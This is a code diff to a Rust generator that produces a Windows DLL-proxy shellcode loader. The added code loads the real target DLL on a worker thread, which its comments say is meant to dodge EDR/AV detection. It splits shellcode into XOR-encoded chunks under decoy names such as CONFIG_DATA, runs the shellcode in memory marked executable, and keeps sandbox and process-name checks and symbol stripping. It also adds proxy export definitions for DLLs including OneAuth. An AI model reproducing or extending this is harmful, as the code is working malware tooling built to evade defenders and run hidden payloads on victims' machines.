@@ -1,9 +1,7 @@
+#![allow(non_snake_case)]
+
 pub fn main_imports() -> String {
     format!(r#"#![allow(warnings)]
-// use std::{{
-//         fs,
-//         ptr::{{copy, null_mut}},
-//     }};
 use std::{{
         ptr::{{copy, null_mut}},
     }};
@@ -25,6 +23,9 @@ use std::time::Duration;
 use std::thread;
 use std::process;
 use std::env;
+use winapi::um::libloaderapi::LoadLibraryW;
+use std::ffi::OsStr;
+use std::os::windows::ffi::OsStrExt;
 "#)
 }
 
@@ -47,21 +48,65 @@ use sha2::{{Digest, Sha256}};
 pub fn code_snippet() -> String {
     format!(r#"
 
+unsafe extern "system" fn load_target_dll(dll_name_ptr: LPVOID) -> DWORD {{
+    // Load target DLL in worker thread to avoid DllMain detection patterns
+    // This reduces EDR/AV detection compared to loading in DllMain
+    if !dll_name_ptr.is_null() {{
+        let dll_name = &*(dll_name_ptr as *const &'static str);
+        let wide_str: Vec<u16> = OsStr::new(*dll_name).encode_wide().chain(Some(0).into_iter()).collect();
+        let _handle = LoadLibraryW(wide_str.as_ptr());
+        Box::from_raw(dll_name_ptr as *mut &'static str);
+    }}
+    0
+}}
+
 unsafe extern "system" fn thread_function(_: LPVOID) -> DWORD {{
     #[cfg(feature = "process_mode")]
-    process_name();
-    #[cfg(feature = "sandbox")]
-    sandbox();
-    thread::sleep(Duration::from_secs(10));
-    initialize();
+    {{
+        if process_name() {{
+            // Process name matches - continue with normal execution
+            #[cfg(feature = "sandbox")]
+            sandbox();
+            thread::sleep(Duration::from_secs(10));
+            initialize();
+        }} else {{
+            // Process name doesn't match - do something else or skip
+            // You can add alternative logic here
+        }}
+    }}
+    
+    #[cfg(not(feature = "process_mode"))]
+    {{
+        // No process mode - always execute
+        #[cfg(feature = "sandbox")]
+        sandbox();
+        thread::sleep(Duration::from_secs(10));
+        initialize();
+    }}
+    
     0 
 }}
 
-#[no_mangle]
+#[unsafe(no_mangle)]
+#[allow(named_asm_labels)]
+#[allow(non_snake_case, unused_variables, unreachable_patterns)]
 pub extern "system" fn DllMain(hinst_dll: HINSTANCE, fdw_reason: DWORD, _: LPVOID) -> BOOL {{
     match fdw_reason {{
         DLL_PROCESS_ATTACH => {{
             unsafe {{
+                // Load target DLL asynchronously in worker thread to avoid DllMain loading patterns
+                // that are commonly flagged by EDR/AV. LoadLibraryW with just filename automatically
+                // searches the DLL search path, including the directory of the calling DLL.
+                // The placeholder will be replaced with actual target DLL name during build.
+                let target_dll_name = r"TARGET_DLL_NAME_PLACEHOLDER.dll";
+                // Only spawn loader thread if placeholder was replaced (DLL proxy build)
+                if !target_dll_name.contains("TARGET_DLL_NAME_PLACEHOLDER") {{
+                    let dll_name_box = Box::new(target_dll_name);
+                    let dll_name_ptr = Box::into_raw(dll_name_box);
+                    let mut loader_thread_id: DWORD = 0;
+                    let _loader_thread = CreateThread(null_mut(), 0, Some(load_target_dll), dll_name_ptr as LPVOID, 0, &mut loader_thread_id);
+                }}
+                
                 let mut thread_id: DWORD = 0;
                 let thread_handle = CreateThread(null_mut(), 0, Some(thread_function),null_mut(),0,&mut thread_id as *mut DWORD );
                 if !thread_handle.is_null() {{
@@ -77,14 +122,26 @@ pub extern "system" fn DllMain(hinst_dll: HINSTANCE, fdw_reason: DWORD, _: LPVOI
 }}
 
 
+// XOR-encoded shellcode chunks (const arrays will be placed here)
+SHELLCODE_CONST_ARRAYS_PLACEHOLDER
+
+fn decode_chunk(chunk: &[u8], key: &[u8]) -> Vec<u8> {{
+    chunk.iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect()
+}}
+
 fn initialize() {{
     unsafe {{
-        let shellcode_buffer: &[u8] = include_bytes!("../stuff.bin");
+        // Reassemble and decode shellcode from scattered chunks
+        let mut shellcode_buffer = Vec::new();
+        SHELLCODE_DECODE_CALLS_PLACEHOLDER
+        
         let shellcode_addr = VirtualAlloc(Some(null_mut()), shellcode_buffer.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         copy(shellcode_buffer.as_ptr() as _, shellcode_addr, shellcode_buffer.len());
         let mut old_protection: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(shellcode_addr, shellcode_buffer.len(), PAGE_EXECUTE_READWRITE, &mut old_protection,).unwrap_or_else(|e| {{
-        panic!("[!] VirtualProtect Failed With Error: {{e}}");
 }});  
         let func: fn() = std::mem::transmute(shellcode_addr);
         func()
@@ -97,18 +154,19 @@ fn initialize() {{
 
 pub fn proceesnamestruct() -> String {
     format!(r#"
-fn process_name() {{
-    let file_name = env::current_exe().map_err(|e| {{
-        process::exit(0x0101);
+fn process_name() -> bool {{
+    let file_name = env::current_exe().map_err(|_| {{
+        false
     }}).ok().and_then(|path| path.file_stem().map(|name| name.to_string_lossy().to_lowercase().to_owned()));
 
     if let Some(name) = file_name {{
         if name == "{}" {{
+            true
         }} else {{
-            process::exit(0x0100);
+            false
         }}
     }} else {{
-        process::exit(0x0102);
+        false
     }}
 }}
 "#, "PLACEHOLDER1")
@@ -172,10 +230,7 @@ ntapi = "0.4.0"
 pelite = "0.9.1"
 winproc = "0.6.4"
 winreg = "*"
-sha2 = "0.10.6"
-[target.x86_64-pc-windows-gnu]
-linker = "x86_64-w64-mingw32-gcc"
-ar = "x86_64-w64-mingw32-ar""#
+sha2 = "0.10.6""#
     )
 }
 
@@ -188,9 +243,22 @@ process_mode = []
 
 
 [profile.release]
-opt-level = 'z'  # Optimize for size
-lto = true       # Enable link time optimizations
-codegen-units = 1  # Reduce codegen units to increase optimization opportunities
+opt-level = 'z'     # Optimize for size
+lto = true          # Enable link-time optimization
+codegen-units = 1   # Reduce number of codegen units
+panic = 'abort'     # Abort on panic
+strip = true        # Strip symbols
+debug-assertions = false
+overflow-checks = false
+incremental = false
+rpath = false
+debug = false       # No debug info
+
+# Additional profile for maximum path stripping
+[profile.release-stripped]
+inherits = "release"
+panic = "abort"
+
 
 [lib]
 path = "src/lib.rs"
@@ -199,16 +267,95 @@ crate-type = ["cdylib"]
     )
 }
 
+pub fn cargo_config_toml() -> String {
+    format!(
+        r#"[build]
+
+[target.x86_64-pc-windows-gnu]
+linker = "x86_64-w64-mingw32-gcc"
+ar = "x86_64-w64-mingw32-ar"
+rustflags = [
+    "-C", "strip=symbols",
+    "-C", "link-arg=-Wl,--gc-sections",
+    "-C", "link-arg=-Wl,--strip-all"
+]
+"#
+    )
+}
+
+pub fn rust_toolchain_toml() -> String {
+    format!(
+        r#"[toolchain]
+channel = "1.85.0"
+components = ["rustfmt", "clippy"]
+"#
+    )
+}
+
+/// Generates XOR-encoded and split shellcode chunks as Rust code
+/// Returns (const_arrays, decode_calls) as a tuple
+pub fn generate_encoded_shellcode(shellcode: &[u8], num_chunks: usize) -> (String, String) {
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    
+    // Split shellcode into chunks
+    let chunk_size = (shellcode.len() + num_chunks - 1) / num_chunks;
+    let chunks: Vec<&[u8]> = shellcode.chunks(chunk_size).collect();
+    
+    let mut output = String::new();
+    let mut chunk_code = String::new();
+    
+    // Generate const arrays for each chunk with unique XOR keys
+    for (i, chunk) in chunks.iter().enumerate() {
+        // Generate random XOR key for this chunk
+        let key_len = 16 + (rng.gen::<usize>() % 17); // Key length 16-32 bytes
+        let key: Vec<u8> = (0..key_len).map(|_| rng.gen()).collect();
+        
+        // XOR encode the chunk
+        let encoded: Vec<u8> = chunk.iter()
+            .enumerate()
+            .map(|(j, &b)| b ^ key[j % key.len()])
+            .collect();
+        
+        // Generate varied const names to look like different data types
+        let const_names = [
+            "CONFIG_DATA", "RESOURCE_TABLE", "LOCALE_INFO", "METADATA_BLOCK",
+            "CERTIFICATE_DATA", "REGISTRY_CACHE", "SETTINGS_BLOB", "TEMPLATE_DATA",
+            "LAYOUT_INFO", "SCHEMA_DEF", "PREFERENCE_STORE", "INDEX_TABLE"
+        ];
+        let const_name = const_names[i % const_names.len()];
+        
+        output.push_str(&format!(
+            "const {}_{}:  [u8; {}] = {:?};\n",
+            const_name, i, encoded.len(), encoded
+        ));
+        output.push_str(&format!(
+            "const XOR_KEY_{}: [u8; {}] = {:?};\n\n",
+            i, key.len(), key
+        ));
+        
+        // Generate decode and extend code
+        chunk_code.push_str(&format!(
+            "        shellcode_buffer.extend(decode_chunk(&{}_{}[..], &XOR_KEY_{}[..]));\n",
+            const_name, i, i
+        ));
+    }
+    
+    // Return const definitions and decode calls as separate strings
+    (output, chunk_code)
+}
+
 pub fn OneAuth() -> String {
     format!(        r#"
-    EXPORTS
-    ?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ=OneAuth-old.?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ @1
-    GetLastOneAuthError=OneAuth-old.GetLastOneAuthError @2
-    InitializeTelemetryCallbacks=OneAuth-old.InitializeTelemetryCallbacks @3
-    OneAuthDiscoverMachineAccountsAsync=OneAuth-old.OneAuthDiscoverMachineAccountsAsync @4
-    Shutdown=OneAuth-old.Shutdown @5
-    Startup=OneAuth-old.Startup @6
-    TryGetAccessToken=OneAuth-old.TryGetAccessToken @7
+EXPORTS
+    ?CreateForAccountTransfer@AuthParameters@Authentication@Microsoft@@SA?AV123@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0000@Z=old-OneAuth.?CreateForAccountTransfer@AuthParameters@Authentication@Microsoft@@SA?AV123@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0000@Z @1
+    ?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ=old-OneAuth.?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ @2
+    GetLastOneAuthError=old-OneAuth.GetLastOneAuthError @3
+    InitializeTelemetryCallbacks=old-OneAuth.InitializeTelemetryCallbacks @4
+    OneAuthDiscoverMachineAccountsAsync=old-OneAuth.OneAuthDiscoverMachineAccountsAsync @5
+    Shutdown=old-OneAuth.Shutdown @6
+    Startup=old-OneAuth.Startup @7
+    TryGetAccessToken=old-OneAuth.TryGetAccessToken @8
     "#
     )
 }
@@ -4505,6 +4652,31 @@ pub fn Wpnapps() -> String {
     )
 }
 
+pub fn well_known_domains() -> String {
+    format!(        r#"
+EXPORTS
+    GetWellKnownDomainListHuffmanTree=old-well_known_domains.GetWellKnownDomainListHuffmanTree @1
+    GetWellKnownDomainListHuffmanTreeSize=old-well_known_domains.GetWellKnownDomainListHuffmanTreeSize @2
+    GetWellKnownDomainListRootPosition=old-well_known_domains.GetWellKnownDomainListRootPosition @3
+    GetWellKnownDomainListTrie=old-well_known_domains.GetWellKnownDomainListTrie @4
+    GetWellKnownDomainListTrieBits=old-well_known_domains.GetWellKnownDomainListTrieBits @5
+    "#
+    )
+}
+
+pub fn domain_actions() -> String {
+    format!(        r#"
+EXPORTS
+    GetDomainActionsURLsHuffmanTree=old-domain_actions.GetDomainActionsURLsHuffmanTree @1
+    GetDomainActionsURLsHuffmanTreeSize=old-domain_actions.GetDomainActionsURLsHuffmanTreeSize @2
+    GetDomainActionsURLsRootPosition=old-domain_actions.GetDomainActionsURLsRootPosition @3
+    GetDomainActionsURLsTrie=old-domain_actions.GetDomainActionsURLsTrie @4
+    GetDomainActionsURLsTrieBits=old-domain_actions.GetDomainActionsURLsTrieBits @5
+    "#
+    )
+}
+
+
 
 pub fn BuildScript() -> String {
     format!(
@@ -4520,5 +4692,6 @@ pub fn BuildScript() -> String {
 "#
     )
 }
+
 
 
